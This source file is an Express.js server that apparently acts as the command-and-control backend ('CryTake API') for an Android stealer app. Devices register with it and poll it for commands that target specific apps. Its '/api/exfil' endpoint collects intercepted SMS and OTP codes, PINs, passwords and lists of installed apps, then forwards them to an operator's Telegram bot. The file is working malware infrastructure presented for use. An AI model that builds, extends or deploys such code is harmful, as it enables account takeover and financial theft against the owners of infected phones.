const express = require('express');
const path = require('path');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// Configuration
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// Store registered devices: { [deviceId]: { name, model, androidVersion, lastSeen, simNumbers, isDndOn, isMonitoring, connectedAt } }
const registeredDevices = {
  'test_device_001': {
    id: 'test_device_001',
    name: 'Test Device (Mock)',
    model: 'Test Phone',
    androidVersion: '12',
    simNumbers: '0000000000',
    lastSeen: new Date().toISOString(),
    connectedAt: new Date().toISOString(),
    isDndOn: false,
    isMonitoring: true,
    online: true
  }
};

// Store pending commands per device: { [deviceId]: [{ type, payload, timestamp }] }
const queuedCommands = {};

// Store captured data per device: { [deviceId]: [{ type, content, extra, timestamp }] }
const capturedData = {};

// Telegram API helper
async function sendTelegramMessage(chatId, botToken, message) {
  if (!botToken || !chatId) {
    console.error('[Telegram] Bot token or chat ID not configured');
    return { success: false, error: 'Bot token or chat ID not configured' };
  }
  
  try {
    const encodedMsg = encodeURIComponent(message);
    const postData = `chat_id=${chatId}&text=${encodedMsg}&parse_mode=Markdown`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: postData
    });
    
    const data = await response.json();
    if (response.ok) {
      console.log('[Telegram] Message sent successfully');
      return { success: true, data };
    } else {
      console.error('[Telegram] Send failed:', data);
      return { success: false, error: data.description || 'Unknown error' };
    }
  } catch (error) {
    console.error('[Telegram] Error:', error);
    return { success: false, error: error.message };
  }
}

// Helper function to format Telegram messages
function formatTelegramMessage(type, content, extra, device, timestamp) {
  const deviceId = device.id || device.name;
  const deviceName = `${device.name || deviceId} (${device.model || 'Unknown'})`;
  
  let title, formattedContent;
  
  switch (type) {
    case 'otp':
    case 'sms':
    case 'sms_intercept':
      title = '📱 OTP/SMS Capture';
      formattedContent = `📋 Type: ${type}\n📝 Content: ${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
      break;
    case 'pin':
    case 'pin_capture':
      title = '🔐 PIN Capture';
      formattedContent = `🔐 *PIN Captured*\n📋 Type: ${type}\n PIN: ${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
      break;
    case 'password_capture':
      title = '🔑 Password Capture';
      formattedContent = `🔑 *Password Captured*\n📋 Type: ${type}\nPassword: ${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
      break;
    case 'installed_apps':
      title = '📱 Installed Apps';
      formattedContent = `📱 *Installed Apps*\n${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
      break;
    case 'sim_number':
    case 'device_register':
      title = '📴 Device Registration';
      formattedContent = `🔔 *New Device Connected*\n📋 Type: ${type}\nContent: ${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
      break;
    case 'dnd_status':
      title = '🔕 DND Status';
      formattedContent = `🔕 *DND Status Update*\nContent: ${content}\nExtra: ${extra}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
      break;
    case 'app_foreground':
      title = '👁️ App Monitoring';
      formattedContent = `👁️ *App Monitoring*\nContent: ${content}\nExtra: ${extra}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
      break;
    case 'target_status':
      title = '🎯 Target Update';
      formattedContent = `🎯 *Target Update*\nContent: ${content}\nExtra: ${extra}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
      break;
    case 'target_list':
      title = '📋 Current Targets';
      formattedContent = `📋 *Current Targets*\n${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
      break;
    case 'anti_revocation':
      title = '🛡️ Anti-Revocation';
      formattedContent = `🛡️ *Anti-Revocation Alert*\nContent: ${content}\nExtra: ${extra}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
      break;
    default:
      title = '🎯 Data Capture';
      formattedContent = `🎯 *Data Capture*\nType: ${type}\nContent: ${content}\nExtra: ${extra || ''}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
  }
  
  return `${title}\n\n${formattedContent}`;
}

// Generate a unique device ID
function generateDeviceId() {
  return 'dev_' + crypto.randomBytes(4).toString('hex').toUpperCase();
}

// Check admin authorization
function isAdmin(req) {
  const token = req.headers['x-admin-token'] || req.query.adminToken || req.body.adminToken;
  return token === ADMIN_TOKEN;
}

// Serve dashboard - path adjusted for api/ subdirectory
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

// API: List all registered devices
app.get('/api/devices', (req, res) => {
  const devices = Object.values(registeredDevices)
    .sort((a, b) => new Date(b.lastSeen).getTime() - new Date(a.lastSeen).getTime());
  
  res.json(devices);
});

// API: Get specific device info
app.get('/api/devices/:deviceId', (req, res) => {
  const device = registeredDevices[req.params.deviceId];
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  res.json(device);
});

// API: Queue a command for a device
app.post('/api/command', (req, res) => {
  const { deviceId, commandType, payload } = req.body;
  
  if (!deviceId || !commandType) {
    return res.status(400).json({ error: 'deviceId and commandType are required' });
  }
  
  const commands = queuedCommands[deviceId] || [];
  commands.push({
    type: commandType,
    payload: JSON.stringify(payload || {}),
    timestamp: Date.now()
  });
  queuedCommands[deviceId] = commands;
  
  res.json({ 
    success: true, 
    message: `Command "${commandType}" queued for device ${deviceId}`,
    commandId: commands.length - 1
  });
});

// API: Device check-in (called by app on startup)
app.post('/api/checkin/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { name, model, androidVersion, simNumbers } = req.body;
  
  // Create or update device record
  registeredDevices[deviceId] = {
    id: deviceId,
    name: name || `Device ${deviceId}`,
    model: model || 'Unknown',
    androidVersion: androidVersion || 'Unknown',
    simNumbers: simNumbers || [],
    lastSeen: new Date().toISOString(),
    connectedAt: registeredDevices[deviceId]?.connectedAt || new Date().toISOString(),
    isDndOn: registeredDevices[deviceId]?.isDndOn || false,
    isMonitoring: registeredDevices[deviceId]?.isMonitoring || true,
    online: true
  };
  
  Log(`📱 Device checked in: ${deviceId} (${name || 'Unknown'})`);
  
  res.json({ 
    success: true, 
    message: 'Check-in successful',
    commands: queuedCommands[deviceId] || []
  });
});

// Command polling endpoint - devices poll this for pending commands
app.get('/api/poll/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  
  // Update device last seen
  if (registeredDevices[deviceId]) {
    registeredDevices[deviceId].lastSeen = new Date().toISOString();
    registeredDevices[deviceId].online = true;
  }
  
  // Get and clear pending commands
  const commands = queuedCommands[deviceId] || [];
  queuedCommands[deviceId] = [];
  
  res.json({ commands, timestamp: Date.now() });
});

// API: Get device status
app.get('/api/status', (req, res) => {
  const deviceCount = Object.keys(registeredDevices).length;
  const onlineCount = Object.values(registeredDevices).filter(d => d.online).length;
  const offlineCount = deviceCount - onlineCount;
  
  res.json({
    name: 'CryTake API',
    status: 'running',
    version: '2.0.0',
    devices: {
      total: deviceCount,
      online: onlineCount,
      offline: offlineCount
    },
    botConfigured: !!TELEGRAM_BOT_TOKEN,
    chatConfigured: !!TELEGRAM_CHAT_ID,
    timestamp: new Date().toISOString()
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: Date.now() });
});

// API: Receive captured data from Decry app (alternative to Telegram direct send)
app.post('/api/exfil/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { type, content, extra } = req.body;
  
  if (!type || !content) {
    return res.status(400).json({ error: 'type and content are required' });
  }
  
  // Store captured data
  if (!capturedData[deviceId]) capturedData[deviceId] = [];
  capturedData[deviceId].push({
    type,
    content,
    extra: extra || '',
    timestamp: Date.now()
  });
  
  // Format message for Telegram
  const device = registeredDevices[deviceId] || { id: deviceId, name: 'Unknown', model: 'Unknown', androidVersion: 'Unknown' };
  const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
  
  const message = formatTelegramMessage(type, content, extra, device, timestamp);
  
  // Send to Telegram asynchronously
  sendTelegramMessage(TELEGRAM_CHAT_ID, TELEGRAM_BOT_TOKEN, message)
    .then(result => {
      if (result.success) {
        Log(`✅ Data exfiltrated for ${deviceId}: ${type}`);
      } else {
        Log(`⚠️ Telegram send failed for ${deviceId}: ${result.error}`);
        // Data still stored locally in capturedData
      }
    });
  
  res.json({ 
    success: true, 
    message: 'Data received and queued for exfiltration',
    stored: true 
  });
});

// API: Get captured data for a device
app.get('/api/data/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const limit = parseInt(req.query.limit) || 100;
  
  const data = capturedData[deviceId] || [];
  const limited = data.slice(-limit).reverse();
  
  res.json({ deviceId, count: data.length, data: limited });
});

// API: Get all captured data
app.get('/api/data', (req, res) => {
  const result = {};
  for (const [deviceId, data] of Object.entries(capturedData)) {
    result[deviceId] = data.slice(-50).reverse();
  }
  res.json(result);
});

// API: Send target app command
app.post('/api/target/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { appId, action } = req.body;
  
  if (!appId) {
    return res.status(400).json({ error: 'appId is required' });
  }
  
  if (action === 'target') {
    queuedCommands[deviceId] = queuedCommands[deviceId] || [];
    queuedCommands[deviceId].push({
      type: 'target_app',
      payload: JSON.stringify({ appId }),
      timestamp: Date.now()
    });
    
    res.json({ success: true, message: `Target command queued for ${appId}` });
  } else if (action === 'untarget') {
    queuedCommands[deviceId] = queuedCommands[deviceId] || [];
    queuedCommands[deviceId].push({
      type: 'untarget_app',
      payload: JSON.stringify({ appId }),
      timestamp: Date.now()
    });
    
    res.json({ success: true, message: `Untarget command queued for ${appId}` });
  } else {
    res.status(400).json({ error: 'Invalid action. Use "target" or "untarget".' });
  }
});

// Start server (only in local non-Vercel environment)
if (!process.env.VERCEL && !process.env.AWS_LAMBDA_FUNCTION_NAME) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    Log(`Server running on port ${PORT}`);
    Log(`Admin token: ${ADMIN_TOKEN}`);
  });
}

module.exports = app;

function Log(message) {
  console.log(`[${new Date().toISOString()}] ${message}`);
}